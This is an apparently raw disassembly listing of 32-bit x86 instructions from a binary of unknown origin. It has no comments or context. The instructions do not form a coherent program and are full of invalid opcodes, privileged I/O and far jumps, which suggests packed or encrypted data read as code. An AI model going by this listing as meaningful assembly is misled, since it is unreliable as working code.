  40c66a:	pop    ss
  40c66b:	jmp    0x40c6e0
  40c66d:	inc    esp
  40c66e:	fwait
  40c66f:	das    
  40c670:	dec    ebp
  40c671:	jmp    0x40c61d
  40c673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c674:	inc    edx
  40c675:	xor    al,0x5f
  40c677:	bound  ecx,QWORD PTR [ebx+0x7b]
  40c67a:	lea    ebp,[edi+ecx*8-0x62]
  40c67e:	shl    DWORD PTR [ecx+0x5f6f69fa],cl
  40c684:	cmp    ebx,esi
  40c686:	or     bl,BYTE PTR [edi]
  40c688:	es (bad) 
  40c68a:	jmp    0xb50d:0xf326f160
  40c691:	pop    ebp
  40c692:	push   ebx
  40c693:	pop    edx
  40c694:	push   edx
  40c695:	jbe    0x40c67e
  40c697:	fs pop ss
  40c699:	call   0xdc501544
  40c69e:	or     DWORD PTR [ebx],ebp
  40c6a0:	jp     0x40c6cc
  40c6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a3:	sbb    BYTE PTR [esi],dl
  40c6a5:	dec    ecx
  40c6a6:	sbb    ebx,DWORD PTR [eax+0x3d]
  40c6a9:	dec    edx
  40c6aa:	pop    ss
  40c6ab:	pop    esp
  40c6ac:	add    al,0x61
  40c6ae:	pop    edi
  40c6af:	imul   edi,DWORD PTR [ebp+0x4f1aa378],0x34
  40c6b6:	cmc    
  40c6b7:	jbe    0x40c63c
  40c6b9:	lods   eax,DWORD PTR ds:[esi]
  40c6ba:	out    dx,eax
  40c6bb:	aad    0x99
  40c6bd:	dec    ecx
  40c6be:	ficom  DWORD PTR [ebx-0x42]
  40c6c1:	or     DWORD PTR [ebp-0x2f3bda90],ebp
  40c6c7:	xlat   BYTE PTR ds:[ebx]
  40c6c8:	xchg   edx,eax
  40c6c9:	add    BYTE PTR [edx-0x5],bl
  40c6cc:	mov    al,0x2d
  40c6ce:	das    
  40c6cf:	test   esp,eax
  40c6d1:	pop    es
  40c6d2:	push   esi
  40c6d3:	jle    0x40c74c
  40c6d5:	xor    al,0xb8
  40c6d7:	nop    DWORD PTR [ebx]
  40c6da:	xchg   esi,eax
  40c6db:	adc    DWORD PTR [eax],esp
  40c6dd:	sub    ebx,DWORD PTR [eax-0x24cb4291]
  40c6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6e4:	fld    DWORD PTR [ebx-0x17]
  40c6e7:	sti    
  40c6e8:	mov    dh,0xdf
  40c6ea:	cmp    eax,0xc8c6dec1
  40c6ef:	jmp    0x496a2db8
  40c6f4:	int3   
  40c6f5:	or     DWORD PTR [esi-0xa],ecx
  40c6f8:	cmp    DWORD PTR [esi],esi
  40c6fa:	shl    DWORD PTR [edx],0x37
  40c6fd:	mov    ch,0x1
  40c6ff:	(bad)  
  40c700:	out    0x6a,al
  40c702:	mov    ebx,0x89d04128
  40c707:	mov    edi,0x7a826e72
  40c70c:	adc    esp,DWORD PTR [ecx]
  40c70e:	loopne 0x40c6c8
  40c710:	mov    ebp,0x89d44b90
  40c715:	rol    DWORD PTR [ecx+0x5d],cl
  40c718:	xchg   esp,eax
  40c719:	xlat   BYTE PTR ds:[ebx]
  40c71a:	push   0x54437521
  40c71f:	dec    esp
  40c720:	repz pop ebp
  40c722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c723:	(bad)  
  40c724:	lahf   
  40c725:	add    esi,0xa56ff7e4
  40c72b:	jns    0x40c757
  40c72d:	cli    
  40c72e:	sbb    esi,ebp
  40c730:	retf   
  40c731:	sub    DWORD PTR [esi],eax
  40c733:	xchg   ebp,eax
  40c734:	inc    edi
  40c735:	and    DWORD PTR [ebp+ebx*4+0x199db8b3],esi
  40c73c:	sub    BYTE PTR [esi-0x28f79ca5],bh
  40c742:	loop   0x40c77e
  40c744:	sbb    DWORD PTR [ebx],esp
  40c746:	push   edi
  40c747:	outs   dx,BYTE PTR ds:[esi]
  40c748:	add    BYTE PTR [eax],dl
  40c74a:	imul   edx,DWORD PTR [ebx*2-0x47ee266c],0x5d17dd34
  40c755:	sub    al,0xe5
  40c757:	or     dl,al
  40c759:	mov    ch,0xaa
  40c75b:	loope  0x40c7d4
  40c75d:	rol    BYTE PTR [esi+0x3593cdc3],1
  40c763:	mov    ch,0x48
  40c765:	jno    0x40c7b3
  40c767:	inc    ebx
  40c768:	out    dx,al
  40c769:	mov    al,ds:0x87c75e02
  40c76e:	fisttp DWORD PTR [ebx+0x6d]
  40c771:	imul   edi,ecx,0x13823bb8
  40c777:	jl     0x40c706
  40c779:	pop    ebx
  40c77a:	mov    edx,0x38a395c7
  40c77f:	xlat   BYTE PTR ds:[ebx]
  40c780:	addr16 jae 0x40c708
  40c783:	fadd   QWORD PTR [ebp+0x5066b4be]
  40c789:	fnsave [ebx-0x4380cb1]
  40c78f:	and    al,0xee
  40c791:	cli    
  40c792:	std    
  40c793:	adc    esi,DWORD PTR [edx-0x3fee1506]
  40c799:	adc    edi,DWORD PTR [ebx]
  40c79b:	inc    esp
  40c79c:	sub    esi,DWORD PTR [esi-0x3267d598]
  40c7a2:	repz pop edx
  40c7a4:	push   ss
  40c7a5:	sub    al,0x4d
  40c7a7:	in     al,dx
  40c7a8:	pop    edi
  40c7a9:	or     al,0xaa
  40c7ab:	dec    ebx
  40c7ac:	fldenv [ebp-0x6e]
  40c7af:	and    eax,0xcd010a32
  40c7b4:	int3   
  40c7b5:	call   0xebe2:0x67b11b56
  40c7bc:	js     0x40c7a6
  40c7be:	mov    edi,DWORD PTR [edi+0x1c]
  40c7c1:	xor    bh,ch
  40c7c3:	ficomp DWORD PTR [edi-0x5be20ce5]
  40c7c9:	adc    DWORD PTR [edi-0x40826a52],0xb9b28f80
  40c7d3:	xchg   esi,eax
  40c7d4:	push   ss
  40c7d5:	cs (bad) 
  40c7d7:	int3   
  40c7d8:	push   ss
  40c7d9:	mov    cl,0x6c
  40c7db:	ret    0xdcee
  40c7de:	je     0x40c7da
  40c7e0:	push   esp
  40c7e1:	outs   dx,BYTE PTR ds:[esi]
  40c7e2:	mov    esp,0x585d5f6b
  40c7e7:	sub    eax,0x20429a20
  40c7ec:	xor    ebp,DWORD PTR [ecx-0x6d]
  40c7ef:	cld    
  40c7f0:	mov    WORD PTR [edi-0x75],ss
  40c7f3:	push   edx
  40c7f4:	pushf  
  40c7f5:	adc    ah,0x71
  40c7f8:	test   BYTE PTR [ecx],al
  40c7fa:	xchg   BYTE PTR [esp+ecx*8-0x7172e551],ah
  40c801:	jmp    0x2487:0x254ac40d
  40c808:	ds enter 0x541b,0x51
  40c80d:	jmp    0x40c823
  40c80f:	dec    ebx
  40c810:	inc    dl
  40c812:	imul   ecx,DWORD PTR [ecx-0x45],0x1bf9c60c
  40c819:	fwait
  40c81a:	sar    ch,cl
  40c81c:	cvtps2pd xmm0,QWORD PTR [ebp+eax*8+0x5c]
  40c821:	jl     0x40c7c7
  40c823:	push   0x5b
  40c825:	add    cl,BYTE PTR [ebp+0x31]
  40c828:	test   eax,0x72ea5b73
  40c82d:	mov    bh,0xf2
  40c82f:	sbb    ebp,0xefc5f347
  40c835:	lds    ebp,FWORD PTR [ebp-0x1f]
  40c838:	pop    edx
  40c839:	add    eax,0xdee30b40
  40c83e:	mov    bl,BYTE PTR ds:0xbb3a88bb
  40c844:	fidiv  DWORD PTR [esi]
  40c846:	xchg   DWORD PTR [ebp+0x45],edx
  40c849:	or     BYTE PTR [ebp-0x10177859],0xe4
  40c850:	imul   esi,DWORD PTR [esp+edi*4+0x573332c2],0x5e
  40c858:	lahf   
  40c859:	stos   DWORD PTR es:[edi],eax
  40c85a:	push   esi
  40c85b:	div    BYTE PTR [esi+0x39]
  40c85e:	das    
  40c85f:	data16 mov cl,0xf9
  40c862:	pop    eax
  40c863:	lods   eax,DWORD PTR ds:[esi]
  40c864:	adc    cl,bl
  40c866:	mov    ebx,0x5435b976
  40c86b:	int3   
  40c86c:	test   dl,bl
  40c86e:	in     al,dx
  40c86f:	sub    ah,bl
  40c871:	pop    esi
  40c872:	into   
  40c873:	sbb    eax,edx
  40c875:	sbb    BYTE PTR [ecx-0x7d],dh
  40c878:	pop    eax
  40c879:	cmp    al,0x5e
  40c87b:	jo     0x40c847
  40c87d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c87f:	jnp    0x40c8ab
  40c881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c882:	xor    esp,esi
  40c884:	stos   DWORD PTR es:[edi],eax
  40c885:	jnp    0x40c8fc
  40c887:	push   ds
  40c888:	adc    al,ch
  40c88a:	mov    bl,0x16
  40c88c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c88d:	jno    0x40c832
  40c88f:	mov    ds:0x730c0507,al
  40c894:	aam    0xa9
  40c896:	or     eax,0xac2727a4
  40c89b:	daa    
  40c89c:	cld    
  40c89d:	add    BYTE PTR [esi-0x58a130d9],bh
  40c8a3:	data16 adc dh,BYTE PTR [ecx+0x29]
  40c8a7:	iret   
  40c8a8:	shl    BYTE PTR [ecx+0x29],0x7b
  40c8ac:	sub    eax,0xb765567a
  40c8b1:	es jecxz 0x40c85f
  40c8b4:	sub    eax,0xd3a6cb43
  40c8b9:	cmp    DWORD PTR [ebx+0x4b01eced],edx
  40c8bf:	cmp    BYTE PTR [esi-0x71],0xbd
  40c8c3:	add    al,0x3c
  40c8c6:	ss sbb al,0x52
  40c8c9:	bound  ebx,QWORD PTR [edi+eiz*4-0x1a]
  40c8cd:	mov    ah,0x54
  40c8cf:	pop    ds
  40c8d0:	out    0x2,eax
  40c8d2:	sti    
  40c8d3:	out    0xff,al
  40c8d5:	in     al,0xba
  40c8d7:	jmp    0x205ddb85
  40c8dc:	jne    0x40c8dc
  40c8de:	outs   dx,BYTE PTR ds:[esi]
  40c8df:	jge    0x40c8b6
  40c8e1:	(bad)  
  40c8e2:	in     al,0xd8
  40c8e4:	ins    DWORD PTR es:[edi],dx
  40c8e5:	lock xor eax,0x3a87f979
  40c8eb:	fnstenv [ecx+0x4f]
  40c8ee:	nop
  40c8ef:	aas    
  40c8f0:	pop    edi
  40c8f1:	aas    
  40c8f2:	or     eax,0xc59ed0df
  40c8f7:	test   al,0xcc
  40c8f9:	aaa    
  40c8fa:	dec    eax
  40c8fb:	test   al,0x1b
  40c8fd:	pop    ebx
  40c8fe:	push   ecx
  40c8ff:	sub    ecx,0x67
  40c902:	stos   BYTE PTR es:[edi],al
  40c903:	jle    0x40c919
  40c905:	into   
  40c906:	xor    bl,bl
  40c908:	ror    DWORD PTR [ebx-0x36931747],1
  40c90e:	pop    es
  40c90f:	dec    ebx
  40c910:	inc    edx
  40c911:	call   FWORD PTR [ecx+ebp*1-0x65cfb47c]
  40c918:	sbb    cl,ch
  40c91a:	pop    ebx
  40c91b:	add    al,0x4b
  40c91d:	ins    BYTE PTR es:[edi],dx
  40c91e:	push   ebp
  40c91f:	out    dx,al
  40c920:	mov    ebp,0xaa7460c9
  40c925:	and    bx,bx
  40c928:	hlt    
  40c929:	imul   eax,DWORD PTR [ecx-0x2b5d20ce],0x39069d8b
  40c933:	scas   al,BYTE PTR es:[edi]
  40c934:	push   ecx
  40c935:	inc    esp
  40c936:	push   ds
  40c937:	and    DWORD PTR [eax-0x7a6a61f5],ecx
  40c93d:	sbb    DWORD PTR [esi+0x7dbae577],eax
  40c943:	and    ch,BYTE PTR ds:0xd1100a9b
  40c949:	mov    edi,0xe78f6283
  40c94e:	dec    edx
  40c94f:	imul   ebp,DWORD PTR [ebx],0x82e2e4a7
  40c955:	and    DWORD PTR [ebx],ecx
  40c957:	pop    edi
  40c958:	inc    ebx
  40c959:	aad    0x91
  40c95b:	fnstenv [edi]
  40c95d:	in     al,dx
  40c95e:	lds    ecx,FWORD PTR [eax]
  40c960:	and    ebx,DWORD PTR [ecx-0x5c]
  40c963:	pop    es
  40c964:	push   ecx
  40c965:	daa    
  40c966:	inc    ecx
  40c967:	cmp    bl,BYTE PTR [eax+0x51b4c1d1]
  40c96d:	cmp    ecx,eax
  40c96f:	mov    eax,ds:0x8bc3c255
  40c974:	push   0x74
  40c976:	mov    eax,ds:0x9ec63eb4
  40c97b:	int3   
  40c97c:	test   ebp,edi
  40c97e:	and    DWORD PTR [ebx],ebx
  40c980:	clc    
  40c981:	mov    edx,0x565d2b34
  40c986:	stos   BYTE PTR es:[edi],al
  40c987:	mov    ?,WORD PTR [eax]
  40c989:	xlat   BYTE PTR ds:[ebx]
  40c98a:	out    dx,eax
  40c98b:	add    ebx,esp
  40c98d:	pop    edi
  40c98e:	(bad)  
  40c98f:	popa   
  40c990:	jmp    FWORD PTR [eax]
  40c992:	push   0x2f
  40c994:	pop    ebp
  40c995:	push   edx
  40c996:	std    
  40c997:	stos   BYTE PTR es:[edi],al
  40c998:	xchg   BYTE PTR [eax-0x23db980c],ah
  40c99e:	clc    
  40c99f:	aaa    
  40c9a0:	lods   al,BYTE PTR ds:[esi]
  40c9a1:	js     0x40c924
  40c9a3:	xor    al,0xe
  40c9a5:	adc    DWORD PTR [esi+0x29603f64],esp
  40c9ab:	lea    edx,ds:0x560a0852
  40c9b1:	jne    0x40c9e6
  40c9b3:	aaa    
  40c9b4:	and    dl,BYTE PTR [ebp-0x54fbb378]
  40c9ba:	pop    edx
  40c9bb:	sub    esi,DWORD PTR [eax+0x62270487]
  40c9c1:	mov    ds:0x64b973ad,eax
  40c9c6:	dec    esi
  40c9c7:	mov    DWORD PTR [ecx-0x5a],ecx
  40c9ca:	aam    0x33
  40c9cc:	sbb    eax,0xc9525688
  40c9d1:	xchg   esi,eax
  40c9d2:	jp     0x40c97a
  40c9d4:	or     DWORD PTR [ecx+eax*1-0x785f889b],eax
  40c9db:	jne    0x40ca3a
  40c9dd:	leave  
  40c9de:	adc    al,0xa1
  40c9e0:	or     eax,0x9ecbd2a7
  40c9e5:	sar    ecx,0x7a
  40c9e8:	sub    eax,0x4fdefa33
  40c9ed:	sub    BYTE PTR [esi-0x27],ch
  40c9f0:	xor    ch,BYTE PTR [ebx]
  40c9f2:	mov    ?,WORD PTR [ecx-0x74]
  40c9f5:	cli    
  40c9f6:	test   BYTE PTR [esi-0x3f],dh
  40c9f9:	cmc    
  40c9fa:	xchg   BYTE PTR [edx-0x738595a7],ah
  40ca00:	hlt    
  40ca01:	adc    dl,dl
  40ca03:	pop    esp
  40ca04:	jns    0x40ca24
  40ca06:	int    0x1a
  40ca08:	xchg   ebp,eax
  40ca09:	xchg   esi,eax
  40ca0a:	mov    ah,0xa5
  40ca0c:	and    esp,0x17
  40ca0f:	pushf  
  40ca10:	stos   DWORD PTR es:[edi],eax
  40ca11:	xchg   ecx,eax
  40ca12:	fcomp  DWORD PTR [ecx-0x41f321c]
  40ca18:	cs mov esi,0x7de25313
  40ca1e:	mov    cs,WORD PTR [ebx-0x708c5300]
  40ca24:	das    
  40ca25:	jo     0x40ca13
  40ca27:	or     ebp,DWORD PTR [edi+ecx*4-0x4a5a3b9c]
  40ca2e:	push   ss
  40ca2f:	jmp    0x2870:0xdd4d72d4
  40ca36:	mov    al,ch
  40ca38:	(bad)  
  40ca39:	mov    dh,BYTE PTR [ebx-0x1f71b780]
  40ca3f:	lock or DWORD PTR [edi],ecx
  40ca42:	lds    ebx,FWORD PTR [ebx-0x39]
  40ca45:	div    BYTE PTR [esi]
  40ca47:	push   eax
  40ca48:	popa   
  40ca49:	gs sbb al,0x3d
  40ca4c:	jg     0x40ca4b
  40ca4e:	sub    al,0x21
  40ca50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca51:	jo     0x40ca46
  40ca53:	push   edi
  40ca54:	jle    0x40ca55
  40ca56:	xchg   ebx,eax
  40ca57:	mov    cs,WORD PTR [esi+0x1b]
  40ca5a:	xchg   esi,eax
  40ca5b:	or     ch,BYTE PTR [ecx-0x1ff3f00c]
  40ca61:	sbb    dh,BYTE PTR [edi-0x3879fb03]
  40ca67:	xor    eax,0x9a53ead2
  40ca6c:	jae    0x40caa3
  40ca6e:	dec    eax
  40ca6f:	(bad)  
  40ca70:	dec    ebx
  40ca71:	cmp    BYTE PTR [esi+0x22],0x7a
  40ca75:	mov    esp,0x62e8dbff
  40ca7a:	outs   dx,DWORD PTR ds:[esi]
  40ca7b:	mov    bh,BYTE PTR [edi-0x555a928b]
  40ca81:	push   edi
  40ca82:	not    BYTE PTR [esi-0x5ec788d9]
  40ca88:	lods   al,BYTE PTR ds:[esi]
  40ca89:	xchg   esi,eax
  40ca8a:	inc    edi
  40ca8b:	aas    
  40ca8c:	inc    eax
  40ca8d:	and    dl,dl
  40ca8f:	add    BYTE PTR [ebx+esi*4-0x2932887a],cl
  40ca96:	test   BYTE PTR [ecx-0x58c2ef7],bl
  40ca9c:	cmp    BYTE PTR ds:0x1ff9acfd,bl
  40caa2:	add    DWORD PTR [esi+0x4],ebp
  40caa5:	cmp    esi,DWORD PTR [eax-0x29d2fc1a]
  40caab:	inc    ebx
  40caac:	pop    edx
  40caad:	jnp    0x40caaa
  40caaf:	out    0xe8,eax
  40cab1:	nop
  40cab2:	mov    ebx,0x7f5e9216
  40cab7:	bnd jp 0x40cae6
  40caba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cabb:	or     edx,DWORD PTR [edi-0x612233fa]
  40cac1:	fcomp  st(0)
  40cac3:	mov    ebp,0x1fecff22
  40cac8:	arpl   WORD PTR ds:0xc3e1bb01,di
  40cace:	push   ecx
  40cacf:	dec    ebp
  40cad0:	out    0x52,al
  40cad2:	cmp    DWORD PTR [ebx],esp
  40cad4:	(bad)  
  40cad6:	xchg   esi,eax
  40cad7:	jmp    0xf823:0xbfb9e246
  40cade:	mov    BYTE PTR ds:0xab9bd143,0xb3
  40cae5:	stos   BYTE PTR es:[edi],al
  40cae6:	pop    edx
  40cae7:	sbb    al,0xa0
  40cae9:	or     eax,esi
  40caeb:	push   ebx
  40caec:	jge    0x40cad9
  40caee:	pop    ebx
  40caef:	ins    BYTE PTR es:[edi],dx
  40caf0:	bnd ret 
  40caf2:	pop    ebx
  40caf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf4:	nop
  40caf5:	pop    edx
  40caf6:	loope  0x40cb3f
  40caf8:	clc    
  40caf9:	test   eax,0xeef38ce4
  40cafe:	jmp    0x981c:0x34aae6e2
  40cb05:	mov    DWORD PTR [ebx-0x2ce998c0],eax
  40cb0b:	leave  
  40cb0c:	jae    0x40cb5a
  40cb0e:	lea    edi,[edi+0x2b]
  40cb11:	push   edx
  40cb12:	xchg   esp,eax
  40cb13:	xchg   ebp,eax
  40cb14:	leave  
  40cb15:	mov    ebx,0xf4b0ae42
  40cb1a:	pop    edx
  40cb1b:	or     bl,BYTE PTR [ebp-0x6e2909cf]
  40cb21:	js     0x40cb90
  40cb23:	mov    esp,0x500ad805
  40cb28:	mov    ecx,0x93a7d0dc
  40cb2d:	pop    ds
  40cb2e:	and    al,0x6b
  40cb30:	ret    0x5258
  40cb33:	mov    ch,dl
  40cb35:	daa    
  40cb36:	mov    dl,0x5b
  40cb38:	shl    DWORD PTR [ecx+0x1b121b86],1
  40cb3e:	pop    esi
  40cb3f:	repz xor BYTE PTR [ebx+edx*2+0x6d],bl
  40cb44:	jecxz  0x40cb79
  40cb46:	bound  edi,QWORD PTR [ebx-0x5f5a8852]
  40cb4c:	jp     0x40cb06
  40cb4e:	mov    esp,0x341db1d
  40cb53:	std    
  40cb54:	data16 fdiv QWORD PTR [edi-0x46]
  40cb58:	jmp    0x40cb20
  40cb5a:	adc    al,BYTE PTR [edx]
  40cb5c:	paddd  mm0,QWORD PTR [ecx]
  40cb5f:	jne    0x40cb82
  40cb61:	clc    
  40cb62:	jg     0x40cba7
  40cb64:	push   0x10
  40cb66:	jle    0x40cb95
  40cb68:	jmp    0xea79c374
  40cb6d:	jns    0x40cba9
  40cb6f:	pop    es
  40cb70:	inc    esi
  40cb71:	sbb    eax,DWORD PTR [edi-0x210975fa]
  40cb77:	push   ecx
  40cb78:	ret    0x2c08
  40cb7b:	sub    DWORD PTR [eax],esi
  40cb7d:	dec    esi
  40cb7e:	not    BYTE PTR [edi+edx*1-0x8]
  40cb82:	xchg   ebp,eax
  40cb83:	xlat   BYTE PTR ds:[ebx]
  40cb84:	mov    edx,0x694dbae6
  40cb89:	scas   eax,DWORD PTR es:[edi]
  40cb8a:	mov    bh,0x65
  40cb8c:	sub    al,0x1e
  40cb8e:	push   0xffffffaa
  40cb90:	mov    bh,BYTE PTR [eax]
  40cb92:	xor    edx,DWORD PTR [eax+0x422f2b5e]
  40cb98:	pop    eax
  40cb99:	cmc    
  40cb9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb9b:	lea    edi,[esi]
  40cb9d:	in     al,dx
  40cb9e:	xchg   ebx,eax
  40cb9f:	sahf   
  40cba0:	mov    esi,0x5e41f29a
  40cba5:	xor    eax,0xc2f6a3f2
  40cbaa:	retf   0x54d8
  40cbad:	and    bh,cl
  40cbaf:	mov    eax,DWORD PTR [esi+0x52]
  40cbb2:	mov    WORD PTR [ebp-0x5739fb44],ss
  40cbb8:	(bad)  
  40cbb9:	sbb    bl,BYTE PTR [esi-0x7c]
  40cbbc:	mov    ?,WORD PTR [ebp+0x7f]
  40cbbf:	outs   dx,DWORD PTR ds:[esi]
  40cbc0:	aaa    
  40cbc1:	jl     0x40cc1b
  40cbc3:	jge    0x40cc18
  40cbc5:	repnz xor al,0xb8
  40cbc8:	jns    0x40cc34
  40cbca:	inc    edi
  40cbcb:	inc    ebx
  40cbcc:	or     DWORD PTR [ebx],ebx
  40cbce:	icebp  
  40cbcf:	out    dx,al
  40cbd0:	popf   
  40cbd1:	jo     0x40cb5e
  40cbd3:	fs push ds
  40cbd5:	repz (bad)
  40cbd8:	mov    esi,0x11b8f3e9
  40cbdd:	xchg   ebx,eax
  40cbde:	ror    DWORD PTR [edx-0x7dd34d],cl
  40cbe4:	pop    ds
  40cbe5:	(bad)  
  40cbe6:	push   ebx
  40cbe7:	mov    edi,0xd63aff7c
  40cbec:	(bad)
  40cbf0:	jmp    0xbcd7b47c
  40cbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbf6:	jae    0x40cbdb
  40cbf8:	mov    ds:0x126fa48d,eax
  40cbfd:	imul   ebx,esi,0xffffffde
  40cc00:	test   eax,0xb849b18d
  40cc05:	out    0x15,eax
  40cc07:	sub    al,0x5c
  40cc09:	jns    0x40cbb1
  40cc0b:	mov    esi,0x6e5459f8
  40cc10:	fist   DWORD PTR [ebp-0x422f22d4]
  40cc16:	xchg   edx,eax
  40cc17:	or     BYTE PTR [eax],0x4e
  40cc1a:	ss dec edi
  40cc1c:	aam    0x8c
  40cc1e:	adc    al,0xee
  40cc20:	sbb    ah,cl
  40cc22:	ret    
  40cc23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc24:	and    al,0x86
  40cc26:	imul   esp,DWORD PTR [ebx],0x10
  40cc29:	xor    cl,BYTE PTR [ebx-0xe]
  40cc2c:	lods   al,BYTE PTR ds:[esi]
  40cc2d:	push   edi
  40cc2e:	(bad)  
  40cc30:	xchg   ecx,eax
  40cc31:	pusha  
  40cc32:	jb     0x40cc88
  40cc34:	adc    DWORD PTR [esi-0x78],ebp
  40cc37:	pop    edx
  40cc38:	fmul   QWORD PTR [ecx+0x58]
  40cc3b:	jl     0x40cc66
  40cc3d:	sub    eax,0x6b8acaf6
  40cc42:	loopne 0x40cc77
  40cc44:	pop    esp
  40cc45:	leave  
  40cc46:	mov    bl,0x7b
  40cc48:	popf   
  40cc49:	lods   eax,DWORD PTR ds:[esi]
  40cc4a:	jo     0x40cc45
  40cc4c:	ds xchg ecx,eax
  40cc4e:	movq   mm5,QWORD PTR [edi]
  40cc51:	mov    bl,0x3b
  40cc53:	xor    eax,0xa8f06059
  40cc58:	in     al,dx
  40cc59:	or     al,0x17
  40cc5b:	retf   0xd8b4
  40cc5e:	jp     0x40cc9d
  40cc60:	jl     0x40cc33
  40cc62:	loope  0x40ccd8
  40cc64:	add    al,0x4f
  40cc66:	mov    ch,0xbc
  40cc68:	mov    es,WORD PTR [edi+ebx*8]
  40cc6b:	adc    DWORD PTR [ecx*1+0x1c411db0],ebx
  40cc72:	and    ecx,esi
  40cc74:	sub    eax,0x6bea424f
  40cc79:	and    edi,edx
  40cc7b:	xchg   ebp,eax
  40cc7c:	sar    DWORD PTR [ecx+0x28],1
  40cc7f:	xchg   ebp,eax
  40cc80:	es leave 
  40cc82:	cli    
  40cc83:	cli    
  40cc84:	cld    
  40cc85:	add    al,0xb
  40cc87:	data16 rcl BYTE PTR [ebp+0x25],cl
  40cc8b:	rcr    BYTE PTR [ecx-0x3f],0x54
  40cc8f:	cmp    al,cl
  40cc91:	sub    DWORD PTR [edx+0x78c5c0b],0xcd61bf55
  40cc9b:	or     edi,ecx
  40cc9d:	adc    DWORD PTR [eax-0xd],ecx
  40cca0:	jmp    0x40cc3f
  40cca2:	mov    BYTE PTR [eax+0x1df0ae3f],al
  40cca8:	popf   
  40cca9:	dec    edx
  40ccaa:	fist   WORD PTR [edi]
  40ccac:	xor    eax,0x7117656f
  40ccb1:	and    al,0xf0
  40ccb3:	mov    edx,0xffc2f95c
  40ccb8:	cdq    
  40ccb9:	pop    ss
  40ccba:	scas   al,BYTE PTR es:[edi]
  40ccbb:	es (bad) 
  40ccbd:	ficomp DWORD PTR [ebp+eiz*2+0x31]
  40ccc1:	add    al,0x19
  40ccc3:	mov    esi,0x89de281d
  40ccc8:	push   cs
  40ccc9:	sub    eax,0x8acf3c77
  40ccce:	push   ebp
  40cccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd0:	out    0xa1,al
  40ccd2:	div    BYTE PTR [ebx]
  40ccd4:	ds inc edx
  40ccd6:	shl    BYTE PTR [edx],1
  40ccd8:	and    al,BYTE PTR fs:[eax+0x3fe1ac3]
  40ccdf:	push   0xc1ea0934
  40cce4:	and    esi,DWORD PTR [esi+ecx*4]
  40cce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce8:	push   0x26
  40ccea:	scas   al,BYTE PTR es:[edi]
  40cceb:	shr    DWORD PTR [esi-0x29],cl
  40ccee:	lods   eax,DWORD PTR ds:[esi]
  40ccef:	cmp    BYTE PTR [edx],dh
  40ccf1:	fdivr  DWORD PTR [edi-0x34]
  40ccf4:	or     bh,al
  40ccf6:	pop    ds
  40ccf7:	(bad)  
  40ccf8:	mov    ch,0x38
  40ccfa:	fnstsw WORD PTR [edx]
  40ccfc:	jns    0x40cd71
  40ccfe:	jl     0x40cd4e
  40cd00:	mov    ch,0xbd
  40cd02:	aam    0x17
  40cd04:	mov    al,al
  40cd06:	jmp    0x4eff:0x7694e8ed
  40cd0d:	mov    ecx,0x8733c288
  40cd12:	or     ch,cl
  40cd14:	pop    ss
  40cd15:	(bad)  
  40cd16:	fnstsw WORD PTR [eax+0x38205700]
  40cd1c:	mov    DWORD PTR [ebp+0xe],ebx
  40cd1f:	ins    BYTE PTR es:[edi],dx
  40cd20:	or     al,0xfd
  40cd22:	push   ss
  40cd23:	inc    ecx
  40cd24:	jo     0x40cd2a
  40cd26:	mov    edx,0x8836078d
  40cd2b:	jmp    0x40cd75
  40cd2d:	pop    ebx
  40cd2e:	adc    eax,0x5b341a6a
  40cd33:	jp     0x40ccf0
  40cd35:	xlat   BYTE PTR ds:[ebx]
  40cd36:	fmul   QWORD PTR [ecx-0xe79bb6f]
  40cd3c:	fs dec eax
  40cd3e:	inc    eax
  40cd3f:	mov    bh,0x1
  40cd41:	vmwrite edi,esi
  40cd44:	cmc    
  40cd45:	hlt    
  40cd46:	and    eax,0x226892b2
  40cd4b:	loopne 0x40cd99
  40cd4d:	addr16 fcmovnb st,st(3)
  40cd50:	jo     0x40cd7c
  40cd52:	jg     0x40cd1e
  40cd54:	xchg   ecx,eax
  40cd55:	xor    eax,0x374e6616
  40cd5a:	ins    DWORD PTR es:[edi],dx
  40cd5b:	mov    edi,0xc6c118b6
  40cd60:	sub    DWORD PTR [eax+0x9],edi
  40cd63:	ins    BYTE PTR es:[edi],dx
  40cd64:	retf   
  40cd65:	lahf   
  40cd66:	cmp    ecx,edi
  40cd68:	mov    eax,0x5da02495
  40cd6d:	push   ebx
  40cd6e:	sbb    ah,dh
  40cd70:	jno    0x40cd6f
  40cd72:	mov    dh,0x75
  40cd74:	jle    0x40cd5a
  40cd76:	inc    edx
  40cd77:	pop    ss
  40cd78:	sbb    al,al
  40cd7a:	test   esi,ebp
  40cd7c:	fs mov ebx,0xfad3b34d
  40cd82:	imul   edx,ebx,0xfffffffd
  40cd85:	push   cs
  40cd86:	fwait
  40cd87:	add    BYTE PTR [esi],bh
  40cd89:	mov    ds:0xce9b8961,al
  40cd8e:	hlt    
  40cd8f:	inc    ecx
  40cd90:	inc    edx
  40cd91:	mov    ebx,0x95810223
  40cd96:	jl     0x40cd93
  40cd98:	test   eax,0xe0cb0c1b
  40cd9d:	xchg   BYTE PTR [edi+0x446c7b90],ah
  40cda3:	fsub   DWORD PTR [ebx]
  40cda5:	push   ds
  40cda6:	cmp    eax,0xb898e95a
  40cdab:	hlt    
  40cdac:	cdq    
  40cdad:	add    ebp,DWORD PTR [ebx+0x7c]
  40cdb0:	lock adc al,0x10
  40cdb3:	add    ebx,DWORD PTR ds:0x401341e
  40cdb9:	push   ebx
  40cdba:	pop    ebx
  40cdbb:	mov    WORD PTR [edi],es
  40cdbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdbe:	repnz nop
  40cdc0:	stc    
  40cdc1:	push   eax
  40cdc2:	(bad)  
